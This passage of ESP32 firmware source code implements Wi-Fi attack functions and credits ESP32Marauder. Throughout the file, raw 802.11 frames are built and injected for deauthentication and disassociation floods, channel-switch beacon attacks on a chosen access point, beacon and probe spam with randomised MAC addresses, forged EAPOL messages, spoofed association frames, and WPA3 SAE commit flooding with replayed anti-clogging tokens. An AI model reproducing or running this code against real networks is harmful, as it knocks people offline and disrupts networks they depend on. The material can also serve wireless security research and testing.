		0x00, 0x00, 0x32, 0x04, 0x0c, 0x12, 0x18, 0x60, 0x28, 0x06,
		0x01, 0x05, 0xff, 0xff, 0x00, 0x64
	};

	uint8_t target_channel = target_ap.channel;

	if (csa) {
		set_channel = target_ap.channel;
		while (target_channel == target_ap.channel) {
			#ifdef BOARD_ESP32_C5_DEVKIT_C1
				target_channel = dual_band_channels[random(DUAL_BAND_CHANNELS)];
			#else
				target_channel = random(14) + 1;
			#endif
		}
	} else {
		set_channel = target_ap.channel;
	}

	changeChannel();
	vTaskDelay(1 / portTICK_PERIOD_MS);

	uint8_t temp[64]; // big enough for worst case
	if (csa) {
		memcpy(temp, post_csa, sizeof(post_csa));
		temp[12] = target_ap.channel;
		temp[16] = target_channel;
		post = temp;
		post_len = sizeof(post_csa);
	} else {
		memcpy(temp, post_quiet, sizeof(post_quiet));
		temp[12] = target_ap.channel;
		post = temp;
		post_len = sizeof(post_quiet);
	}

	for (int i = 0; i < 6; i++) {
		beacon_frame_packet[10 + i] = target_ap.bssid[i];
		beacon_frame_packet[16 + i] = beacon_frame_packet[10 + i];
	}

	char ESSID[target_ap.essid.length() + 1] = {};
  	target_ap.essid.toCharArray(ESSID, target_ap.essid.length() + 1);

	int realLen = strlen(ESSID);
	
	beacon_frame_packet[37] = realLen;

	for(int i = 0; i < realLen; i++) beacon_frame_packet[38 + i] = ESSID[i];

	memcpy(beacon_frame_packet + (38 + realLen), post, post_len);

	beacon_frame_packet[34] = target_ap.beacon[0];
	beacon_frame_packet[35] = target_ap.beacon[1];
	

	esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);
	esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);
	esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);

	packet_sent = packet_sent + 3;

    if (res_1 != ESP_OK)
		packet_sent -= 1;
    if (res_2 != ESP_OK)
		packet_sent -= 1;
    if (res_3 != ESP_OK)
		packet_sent -= 1;
}

// https://github.com/justcallmekoko/ESP32Marauder/blob/master/esp32_marauder/WiFiScan.cpp
void WiFiModules::sendCustomBeacon(AccessPoint custom_ssid) {
	if (!wifi_initialized) {
		Serial.println("[ERROR] WiFi is not initialized, cannot send beacon frame.");
		return;
	}

	static const uint8_t post_base[] = {
		0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
		0x03, 0x01, 0x04, 0x30, 0x18, 0x01, 0x00, 0x00, 0x0f, 0xac, 
		0x02, 0x02, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 
		0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00
	};

	//channelRandom();
	//vTaskDelay(1 / portTICK_PERIOD_MS);  

	// Randomize SRC MAC
	char ESSID[custom_ssid.essid.length() + 1] = {};
	custom_ssid.essid.toCharArray(ESSID, custom_ssid.essid.length() + 1);

	int realLen = strlen(ESSID);
	int ssidLen = random(realLen, 33);

	int frame_len = 37 + sizeof(post_base) + ssidLen + 1;

	uint8_t temp_frame[frame_len];
	memcpy(temp_frame, beacon_frame_packet, frame_len);

	temp_frame[10] = temp_frame[16] = (random(256) & 0xFE) | 0x02;
	temp_frame[11] = temp_frame[17] = random(256);
	temp_frame[12] = temp_frame[18] = random(256);
	temp_frame[13] = temp_frame[19] = random(256);
	temp_frame[14] = temp_frame[20] = random(256);
	temp_frame[15] = temp_frame[21] = random(256);

	temp_frame[34] = custom_ssid.beacon[0];
	temp_frame[35] = custom_ssid.beacon[1];

	temp_frame[37] = ssidLen;

	for(int i = 0; i < realLen; i++)
		temp_frame[38 + i] = ESSID[i];

	for(int i = 0; i < ssidLen - realLen; i++)
		temp_frame[38 + realLen + i] = 0x20;

	temp_frame[50 + ssidLen] = set_channel;

	memcpy(temp_frame + (38 + ssidLen), post_base, sizeof(post_base));

	esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, temp_frame, sizeof(temp_frame), false);
	esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, temp_frame, sizeof(temp_frame), false);
	esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, temp_frame, sizeof(temp_frame), false);

	packet_sent = packet_sent + 3;

    if (res_1 != ESP_OK)
		packet_sent -= 1;
    if (res_2 != ESP_OK)
		packet_sent -= 1;
    if (res_3 != ESP_OK)
		packet_sent -= 1;
}

void WiFiModules::sendCustomESSIDBeacon(const char* ESSID) {
	if (!wifi_initialized) {
		Serial.println("[ERROR] WiFi is not initialized, cannot send beacon frame.");
		return;
	}

	static const uint8_t post_base[] = {
		0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
		0x03, 0x01, 0x04, 0x30, 0x18, 0x01, 0x00, 0x00, 0x0f, 0xac, 
		0x02, 0x02, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 
		0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00
	};

	int ssidLen = strlen(ESSID);

	int frame_len = 37 + sizeof(post_base) + ssidLen + 1;

	uint8_t temp_frame[frame_len];
	memcpy(temp_frame, beacon_frame_packet, frame_len);

	temp_frame[10] = temp_frame[16] = (random(256) & 0xFE) | 0x02;
	temp_frame[11] = temp_frame[17] = random(256);
	temp_frame[12] = temp_frame[18] = random(256);
	temp_frame[13] = temp_frame[19] = random(256);
	temp_frame[14] = temp_frame[20] = random(256);
	temp_frame[15] = temp_frame[21] = random(256);

	temp_frame[37] = ssidLen;

	// Insert my tag
	for(int i = 0; i < ssidLen; i++)
		temp_frame[38 + i] = ESSID[i];

	/////////////////////////////
	
	temp_frame[50 + ssidLen] = this->set_channel;

	memcpy(temp_frame + (38 + ssidLen), post_base, sizeof(post_base));

	esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, temp_frame, sizeof(temp_frame), false);
	esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, temp_frame, sizeof(temp_frame), false);
	esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, temp_frame, sizeof(temp_frame), false);

	packet_sent = packet_sent + 3;

    if (res_1 != ESP_OK)
		packet_sent -= 1;
    if (res_2 != ESP_OK)
		packet_sent -= 1;
    if (res_3 != ESP_OK)
		packet_sent -= 1;
}

void WiFiModules::sendBeaconRandomSSID() {
	if (!wifi_initialized) {
		Serial.println("[ERROR] WiFi is not initialized, cannot send beacon frame.");
		return;
	}

	static const uint8_t post_base[] = {
		0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
		0x03, 0x01, 0x04, 0x30, 0x18, 0x01, 0x00, 0x00, 0x0f, 0xac, 
		0x02, 0x02, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 
		0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00
	};

	//channelRandom();  

	// Randomize SRC MAC
	int ssidLen = random(1, 33);

	int frame_len = 37 + sizeof(post_base) + ssidLen + 1;


	uint8_t temp_frame[frame_len];
	memcpy(temp_frame, beacon_frame_packet, frame_len);

	temp_frame[10] = temp_frame[16] = (random(256) & 0xFE) | 0x02;
	temp_frame[11] = temp_frame[17] = random(256);
	temp_frame[12] = temp_frame[18] = random(256);
	temp_frame[13] = temp_frame[19] = random(256);
	temp_frame[14] = temp_frame[20] = random(256);
	temp_frame[15] = temp_frame[21] = random(256);

	temp_frame[37] = ssidLen;

	for (int i = 0; i < ssidLen; i++)
		temp_frame[38 + i] = alfa[random(65)];
	
	temp_frame[50 + ssidLen] = set_channel;

	int post_len = sizeof(post_base);

	memcpy(temp_frame + (38 + ssidLen), post_base, post_len);

	esp_err_t res;
	for (int i = 0; i < 2; i++)	res = esp_wifi_80211_tx(WIFI_IF_AP, temp_frame, sizeof(temp_frame), false);
	
	packet_sent = packet_sent + 2;
    if (res != ESP_OK)
        packet_sent -= 1;
}

void WiFiModules::sendDeauthAttack() {
	if (!wifi_initialized) {
		Serial.println("[ERROR] WiFi is not initialized, cannot send deauth frame.");
		return;
	}

	for (int i = 0; i < access_points->size(); i++) {
		// Check if active
		if (access_points->get(i).selected) {
			this->set_channel = access_points->get(i).channel;
			changeChannel();
			vTaskDelay(1/ portTICK_PERIOD_MS);
			
			// Build packet
			
			memcpy(&deauth_frame_packet[10], access_points->get(i).bssid, 6);
			memcpy(&deauth_frame_packet[16], access_points->get(i).bssid, 6);

			memcpy(&disassoc_frame_packet[10], access_points->get(i).bssid, 6);
			memcpy(&disassoc_frame_packet[16], access_points->get(i).bssid, 6);    
		
			// Send packet
			esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
			esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
			esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
		
			esp_err_t res_4 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
			esp_err_t res_5 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
			esp_err_t res_6 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
			packet_sent = packet_sent + 6;
		
			if (res_1 != ESP_OK)
				packet_sent -= 1;
			if (res_2 != ESP_OK)
				packet_sent -= 1;
			if (res_3 != ESP_OK)
				packet_sent -= 1;
			if (res_4 != ESP_OK)
				packet_sent -= 1;
			if (res_5 != ESP_OK)
				packet_sent -= 1;
			if (res_6 != ESP_OK)
				packet_sent -= 1;
		}
	}
}

void WiFiModules::sendDeauthFrame(uint8_t bssid[6], int channel) {
	this->set_channel = channel;
	changeChannel();
	delay(1);
	
	// Build packet
	memcpy(&deauth_frame_packet[10], bssid, 6);
	memcpy(&deauth_frame_packet[16], bssid, 6);

	memcpy(&disassoc_frame_packet[10], bssid, 6);
	memcpy(&disassoc_frame_packet[16], bssid, 6);     
  
	// Send packet
	esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
	esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
	esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);

	esp_err_t res_4 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
	esp_err_t res_5 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
	esp_err_t res_6 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
}

void WiFiModules::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t sta_mac[6]) {
	if (!wifi_initialized) {
		Serial.println("[ERROR] WiFi is not initialized, cannot send deauth frame.");
		return;
	}

	this->set_channel = channel;
	changeChannel();
	delay(1);
	
	// Build AP source packet
	memcpy(&deauth_frame_packet[4], sta_mac, 6);
	memcpy(&deauth_frame_packet[10], bssid, 6);
	memcpy(&deauth_frame_packet[16], bssid, 6);

	memcpy(&disassoc_frame_packet[4], sta_mac, 6);
	memcpy(&disassoc_frame_packet[10], bssid, 6);
	memcpy(&disassoc_frame_packet[16], bssid, 6);
	// Send packet
	esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
	esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
	esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);

	esp_err_t res_4 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
	esp_err_t res_5 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
	esp_err_t res_6 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
	packet_sent = packet_sent + 6;

	if (res_1 != ESP_OK)
		packet_sent -= 1;
	if (res_2 != ESP_OK)
		packet_sent -= 1;
	if (res_3 != ESP_OK)
		packet_sent -= 1;
	if (res_4 != ESP_OK)
		packet_sent -= 1;
	if (res_5 != ESP_OK)
		packet_sent -= 1;
	if (res_6 != ESP_OK)
		packet_sent -= 1;
  
	// Build AP dest packet
	memcpy(&deauth_frame_packet[4], bssid, 6);
	memcpy(&deauth_frame_packet[10], sta_mac, 6);
	memcpy(&deauth_frame_packet[16], sta_mac, 6);

	memcpy(&disassoc_frame_packet[4], bssid, 6);
	memcpy(&disassoc_frame_packet[10], sta_mac, 6);
	memcpy(&disassoc_frame_packet[16], sta_mac, 6);     
  
	// Send packet
	esp_err_t res_1_1 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
	esp_err_t res_2_1 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
	esp_err_t res_3_1 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);

	esp_err_t res_4_1 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
	esp_err_t res_5_1 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
	esp_err_t res_6_1 = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame_packet, sizeof(disassoc_frame_packet), false);
	packet_sent = packet_sent + 6;

	if (res_1_1 != ESP_OK)
		packet_sent -= 1;
	if (res_2_1 != ESP_OK)
		packet_sent -= 1;
	if (res_3_1 != ESP_OK)
		packet_sent -= 1;
	if (res_4_1 != ESP_OK)
		packet_sent -= 1;
	if (res_5_1 != ESP_OK)
		packet_sent -= 1;
	if (res_6_1 != ESP_OK)
		packet_sent -= 1;
  }

void WiFiModules::sendProbeAttack() {
	for (int i = 0; i <access_points->size(); i++) {
		if (access_points->get(i).selected) {
			this->set_channel = access_points->get(i).channel;
			changeChannel();
			vTaskDelay(1 / portTICK_PERIOD_MS);
      
			// Build packet
			// Randomize SRC MAC
			for (int i = 0; i < 6; i++) {
				probe_frame_packet[10 + i] = random(256);
			}

			// Set SSID length
			int ssidLen = access_points->get(i).essid.length();

			probe_frame_packet[25] = ssidLen;

			// Insert ESSID
			char buf[ssidLen + 1] = {};
			access_points->get(i).essid.toCharArray(buf, ssidLen + 1);
			
			for(int i = 0; i < ssidLen; i++)
				probe_frame_packet[26 + i] = buf[i];
				
			uint8_t postSSID[40] = {0x00, 0x00, 0x01, 0x08, 0x8c, 0x12, 
									0x18, 0x24, 0x30, 0x48, 0x60, 0x6c, 
									0x2d, 0x1a, 0xad, 0x01, 0x17, 0xff, 
									0xff, 0x00, 0x00, 0x7e, 0x00, 0x00, 
									0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 
									0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
									0x00, 0x00, 0x00, 0x00};

			uint8_t good_probe_req_packet[26 + ssidLen + 40] = {};
			
			for (int i = 0; i < 26 + ssidLen; i++)
				good_probe_req_packet[i] = probe_frame_packet[i];

			for(int i = 0; i < 40; i++) 
				good_probe_req_packet[26 + ssidLen + i] = postSSID[i];
			esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);
			esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);
			esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);

			packet_sent = packet_sent + 3;

			if (res_1 != ESP_OK)
				packet_sent -= 1;
			if (res_2 != ESP_OK)
				packet_sent -= 1;
			if (res_3 != ESP_OK)
				packet_sent -= 1;
		}
	}
}

void WiFiModules::sendEapolBagMsg(uint8_t bssid[6], int channel, uint8_t mac[6], uint8_t sec) {
	this->set_channel = channel;
	changeChannel();
  
	// Build packet
	memcpy(&eapol_packet_bad_msg1[4], mac, 6);
  
	memcpy(&eapol_packet_bad_msg1[10], bssid, 6);
	memcpy(&eapol_packet_bad_msg1[16], bssid, 6);
  
	/* Generate random Nonce */
	for (uint8_t i = 0; i < 32; i++) {
	  eapol_packet_bad_msg1[49 + i] = esp_random() & 0xFF;
	}
	/* Update replay counter */
	for (uint8_t i = 0; i < 8; i++) {
	  eapol_packet_bad_msg1[41 + i] = (packet_sent >> (56 - i * 8)) & 0xFF;
	}
  
	if(sec == WIFI_SECURITY_WPA3 || sec == WIFI_SECURITY_WPA3_ENTERPRISE || sec == WIFI_SECURITY_WAPI) {
	  eapol_packet_bad_msg1[38] = 0xCB;      // Key‑Info (LSB)  Install|Ack|Pairwise, ver=3
	  eapol_packet_bad_msg1[39] = 0x00;      // Key Length MSB
	  eapol_packet_bad_msg1[40] = 0x00;      // Key Length LSB   (must be 0 with GCMP)
	}
	else {
	  eapol_packet_bad_msg1[38] = 0xCA;      // Key‑Info (LSB)  Install|Ack|Pairwise, ver=3
	  eapol_packet_bad_msg1[39] = 0x00;      // Key Length MSB
	  eapol_packet_bad_msg1[40] = 0x10;      // Key Length LSB   (must be 0 with GCMP)
	}
  
	// Send packet
	esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
	esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
	esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);

	packet_sent = packet_sent + 3;

	if (res_1 != ESP_OK)
		packet_sent -= 1;
	if (res_2 != ESP_OK)
		packet_sent -= 1;
	if (res_3 != ESP_OK)
		packet_sent -= 1;
}

void WiFiModules::sendAssociationSleep(const char* ESSID, uint8_t bssid[6], int channel, uint8_t sta_mac[6]) {
	// https://github.com/justcallmekoko/ESP32Marauder/blob/master/esp32_marauder/WiFiScan.cpp#L6646
	this->set_channel = channel;
	changeChannel();

	// Build packet
	static uint16_t sequence_number = 0;

	memcpy(&association_packet[4], bssid, 6);
	memcpy(&association_packet[10], sta_mac, 6);
	memcpy(&association_packet[16], bssid, 6);

	/* Set Sequence Control */
	association_packet[23] = (sequence_number >> 8) & 0xFF; // Sequence Number MSB
	association_packet[22] = sequence_number & 0xFF;        // Sequence Number LSB
  
	/* SSID tag */
	association_packet[29] = (uint8_t)strlen((char *)ESSID); // SSID Length
	memcpy(&association_packet[30], ESSID, strlen((char *)ESSID)); // SSID
  
	/* Supported Rates tag */
	uint16_t offset = 30 + strlen((char *)ESSID); // Offset after SSID);
	association_packet[offset++] = 0x01; // Supported Rates tag
	association_packet[offset++] = 0x04; // Length
	association_packet[offset++] = 0x82;  // 1 Mbps
	association_packet[offset++] = 0x04;  // 2 Mbps
	association_packet[offset++] = 0x0b;  // 5.5 Mbps
	association_packet[offset++] = 0x16;  // 11 Mbps
  
	/* Power Capability tag */
	association_packet[offset++] = 0x21; // Power Capability tag
	association_packet[offset++] = 0x02; // Length
	association_packet[offset++] = 0x01; // Min Tx Power
	association_packet[offset++] = 0x15; // Max Tx Power
  
	/* Supported Channels tag */
	association_packet[offset++] = 0x24; // Supported Channels tag
	association_packet[offset++] = 0x02; // Length
	association_packet[offset++] = 0x01; // First Channel
	association_packet[offset++] = 0x0d; // Last Channel
  
	/* RSN tag */
	association_packet[offset++] = 0x30; // RSN tag
	association_packet[offset++] = 0x14; // Length
	association_packet[offset++] = 0x01; // Version MSB
	association_packet[offset++] = 0x00; // Version LSB
	association_packet[offset++] = 0x00; // Group Cipher Suite OUI MSB
	association_packet[offset++] = 0x0F; // Group Cipher Suite OUI LSB
	association_packet[offset++] = 0xAC; // Group Cipher Suite OUI LSB
	association_packet[offset++] = 0x04; // Group Cipher Suite Type (AES-CCMP)
	association_packet[offset++] = 0x01; // Pairwise Cipher Suite Count
	association_packet[offset++] = 0x00; // Pairwise Cipher Suite Count MSB
	association_packet[offset++] = 0x00; // Pairwise Cipher Suite OUI MSB
	association_packet[offset++] = 0x0F; // Pairwise Cipher Suite OUI LSB
	association_packet[offset++] = 0xAC; // Pairwise Cipher Suite OUI LSB
	association_packet[offset++] = 0x04; // Pairwise Cipher Suite Type (AES-CCMP)
	association_packet[offset++] = 0x01; // AKM Suite Count
	association_packet[offset++] = 0x00; // AKM Suite Count MSB
	association_packet[offset++] = 0x00; // AKM Suite OUI MSB
	association_packet[offset++] = 0x0f; // AKM Suite OUI MSB
	association_packet[offset++] = 0xAC; // AKM Suite OUI LSB
	association_packet[offset++] = 0x02; // AKM Suite OUI LSB (WPA2-PSK)
	association_packet[offset++] = 0x0c; // RSN Capabilities MSB
	association_packet[offset++] = 0x00; // RSN Capabilities LSB
  
	/* Supported Operating Classes tag */
	association_packet[offset++] = 0x3b; // Supported Operating Classes tag
	association_packet[offset++] = 0x14; // Length
	association_packet[offset++] = 0x51; // Current Operating Class 1 (2.4 GHz)
	/* alternate Operating Class */
	association_packet[offset++] = 0x86; // Operating Class 2 (5 GHz)
	association_packet[offset++] = 0x85; // Operating Class 3 (6 GHz)
	association_packet[offset++] = 0x84; // Operating Class 4 (60 GHz)
	association_packet[offset++] = 0x83; // Operating Class 5 (60 GHz)
	association_packet[offset++] = 0x81; // Operating Class 6 (60 GHz)
	association_packet[offset++] = 0x7f; // Operating Class 7 (60 GHz)
	association_packet[offset++] = 0x7e; // Operating Class 8 (60 GHz)
	association_packet[offset++] = 0x7d; // Operating Class 9 (60 GHz)
	association_packet[offset++] = 0x7c; // Operating Class 10 (60 GHz)
	association_packet[offset++] = 0x7b; // Operating Class 11 (60 GHz)
	association_packet[offset++] = 0x7a; // Operating Class 12 (60 GHz)
	association_packet[offset++] = 0x79; // Operating Class 13 (60 GHz)
	association_packet[offset++] = 0x78; // Operating Class 14 (60 GHz)
	association_packet[offset++] = 0x77; // Operating Class 15 (60 GHz)
	association_packet[offset++] = 0x76; // Operating Class 16 (60 GHz)
	association_packet[offset++] = 0x75; // Operating Class 17 (60 GHz)
	association_packet[offset++] = 0x74; // Operating Class 18 (60 GHz)
	association_packet[offset++] = 0x73; // Operating Class 19 (60 GHz)
	association_packet[offset++] = 0x51; // Operating Class 20 (2.4 GHz)
  
	/* Vendor Specific tag */
	association_packet[offset++] = 0xdd; // Vendor Specific tag
	association_packet[offset++] = 0x0a; // Length
	association_packet[offset++] = 0x00;
	association_packet[offset++] = 0x10;
	association_packet[offset++] = 0x18;
	association_packet[offset++] = 0x02;
	association_packet[offset++] = 0x00;
	association_packet[offset++] = 0x00;
	association_packet[offset++] = 0x10;
	association_packet[offset++] = 0x00;
	association_packet[offset++] = 0x00;
	association_packet[offset++] = 0x02;
  
	// Send packet
	esp_wifi_80211_tx(WIFI_IF_AP, association_packet, offset, false);
  
	packet_sent += 1;

}

bool WiFiModules::filterActive() {
  for (int i = 0; i < access_points->size(); i++) {
    if (access_points->get(i).selected)
      return true;
  }

  return false;
}


bool WiFiModules::sendSAECommitFrame(uint8_t target_mac[6], uint8_t src_mac[6]) {
	uint8_t frame[256];
	uint8_t ecp_point_bin[65];
	size_t bin_len = 0;
	int write_bin_result = -1;

	memset(frame, 0, sizeof(frame));

	for (int i = 0; i < 32; i++) // Copy frame header
		frame[i] = sae_commit_packet[i];

	for (int i = 0; i < 6; i++) { // Copy addresses
		frame[4 + i] = target_mac[i];
		frame[10 + i] = src_mac[i];
		frame[16 + i] = target_mac[i];
	}

	frame[30] = 0x13;  // SAE Group

	uint8_t *current_index = frame + 32;
	size_t scalar_len = 32;

	if (mbedtls_mpi_fill_random(&prec_int, scalar_len, mbedtls_ctr_drbg_random, &ctr_drbg) != 0)
		return false;

	// Repeat only if invalid
	while (mbedtls_mpi_cmp_int(&prec_int, 1) <= 0 || mbedtls_mpi_cmp_mpi(&prec_int, &ecp_group.N) >= 0) {
		if (mbedtls_mpi_fill_random(&prec_int, scalar_len, mbedtls_ctr_drbg_random, &ctr_drbg) != 0)
		return false;
	}

	if (mbedtls_mpi_write_binary(&prec_int, current_index, scalar_len) != 0) return false;

	if (mbedtls_ecp_mul(&ecp_group, &ecp_point, &prec_int, &ecp_group.G, mbedtls_ctr_drbg_random, &ctr_drbg) != 0) return false;

	write_bin_result = mbedtls_ecp_point_write_binary(&ecp_group, &ecp_point, MBEDTLS_ECP_PF_UNCOMPRESSED, &bin_len, ecp_point_bin, sizeof(ecp_point_bin));

	if ((write_bin_result != 0) || (bin_len != 65)) return false;

	for (size_t i = 0; i < scalar_len; i++)
		current_index++;

	for (size_t i = 0; i < 64; i++)
		current_index[i] = ecp_point_bin[i + 1];

	for (int i = 0; i < 64; i++)
		current_index++;

	// If ACT exists, append it to the frame
	if (this->current_act_len > 0 && current_act != NULL) {
		*current_index++ = 0x4C; // ACT required

		*current_index++ = this->current_act_len;

		for (size_t i = 0; i < this->current_act_len; i++)
		current_index[i] = current_act[i];

		for (int i = 0; i < this->current_act_len; i++)
		current_index++;
	}

	if (esp_wifi_80211_tx(WIFI_IF_STA, frame, current_index - frame, false) != ESP_OK ||
	    esp_wifi_80211_tx(WIFI_IF_STA, frame, current_index - frame, false) != ESP_OK ||
		esp_wifi_80211_tx(WIFI_IF_STA, frame, current_index - frame, false) != ESP_OK)
		return false;

	this->data_frames++;

	return true;
}

bool WiFiModules::getSAEACT(const uint8_t *frame, size_t frame_len, uint16_t &group_out, size_t &act_len_out) {
  extern WiFiModules wifi;

  bool is_sae = false;
  uint8_t frame_header_len = 32;
  bool ap_found = false;

  // Filter on SAE commit
  if ((frame_len > frame_header_len) &&
      (frame[0] == 0xB0) &&
      (frame[24] == 0x03) &&
      (frame[26] == 0x01)) {
    is_sae = true;

    // Check if filtering on AP
    if (wifi.filterActive()) {
      uint8_t src_addr[6];
      getMAC(src_addr, frame, 10);
      for (int i = 0; i < access_points->size(); i++) {
        if (wifi.mac_cmp(src_addr, access_points->get(i).bssid)) {
          ap_found = true;
          break;
        }
      }

      if (!ap_found)
        return false;
    }

    // Filter on ACT required
    if (frame[28] == 0x4C) {

      const uint8_t *act_index = frame + frame_header_len;
      act_len_out = frame_len - frame_header_len;

      // Copy ACT
      if (act_len_out != 0) {
        if (current_act)
          free(current_act);

        current_act = (uint8_t *)malloc(act_len_out);
        if (current_act) {
          memcpy(current_act, act_index, act_len_out);
        }
      }
    }
  }

  return is_sae;
}